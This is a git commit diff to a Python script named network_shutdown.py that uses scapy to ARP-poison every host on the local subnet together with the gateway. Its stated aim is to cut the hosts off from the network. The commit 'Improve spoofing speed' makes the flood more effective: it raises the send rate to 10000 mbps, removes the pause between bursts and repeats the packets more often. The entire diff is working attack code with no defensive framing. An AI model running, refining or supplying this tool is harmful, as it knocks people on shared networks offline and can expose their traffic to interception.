8143f240500846d11699ad97a785664aeba2fa88
Tomás Sexenian <tomas.lopez@zyte.com>
2025-04-10 21:09:32 -0300

    Improve spoofing speed

--- network_shutdown.py
+++ network_shutdown.py
@@ -1,16 +1,16 @@
 import time
 import os
 import socket
-from scapy.all import ARP, Ether, sendpfast, srp, getmacbyip, conf
+from scapy.all import ARP, Ether, sendpfast, srp, getmacbyip, get_if_hwaddr, conf
 
 if os.geteuid() != 0:
     print("Run with sudo.")
     exit(1)
 
 attack_active = True
-mac_attacker = Ether().src
+interface = conf.iface
+mac_attacker = get_if_hwaddr(interface)
 conf.verb = 0
-
 
 def get_gateway():
     try:
@@ -18,51 +18,39 @@ def get_gateway():
     except:
         return None
 
-
 def get_local_ip():
     try:
         return socket.gethostbyname(socket.gethostname())
     except:
         return socket.gethostbyname_ex(socket.gethostname())[2][0]
 
-
 def get_network():
     ip = get_local_ip().split('.')
     return f"{ip[0]}.{ip[1]}.{ip[2]}.0/24"
 
-
 def scan_network():
-    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=get_network()), timeout=2, verbose=0)
+    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=get_network()), timeout=2, iface=interface, verbose=0)
     local_ip = get_local_ip()
     gateway = get_gateway()
     return {rcv.psrc: rcv.hwsrc for _, rcv in ans if rcv.psrc not in (local_ip, gateway)}
 
-
 def generate_packets(targets, gateway_ip, gateway_mac):
     packets = []
     for target_ip, target_mac in targets.items():
-        packets += [
-            Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwsrc=mac_attacker),
-            Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwsrc=mac_attacker)
-        ]
-    return packets * 15
-
+        packets.append(Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwsrc=mac_attacker))
+        packets.append(Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwsrc=mac_attacker))
+    return packets * 25
 
 def spoof_loop(packets):
     while attack_active:
-        sendpfast(packets, mbps=500, loop=100, parse_results=False)
-        time.sleep(0.01)
-
+        sendpfast(packets, iface=interface, mbps=10000, loop=50, parse_results=False)
 
 def restore_targets(targets, gateway_ip, gateway_mac):
     restore_packets = []
     for target_ip, target_mac in targets.items():
-        restore_packets += [
-                               Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwsrc=gateway_mac),
-                               Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwsrc=target_mac)
-                           ] * 25
-    sendpfast(restore_packets, mbps=1000)
-
+        restore_packets.append(Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwsrc=gateway_mac))
+        restore_packets.append(Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwsrc=target_mac))
+    sendpfast(restore_packets * 10, iface=interface, mbps=1000)
 
 def main():
     global attack_active
@@ -89,7 +77,6 @@ def main():
         attack_active = False
         print("\nRestoring network...")
         restore_targets(targets, gateway_ip, gateway_mac)
-
 
 if __name__ == '__main__':
     main()
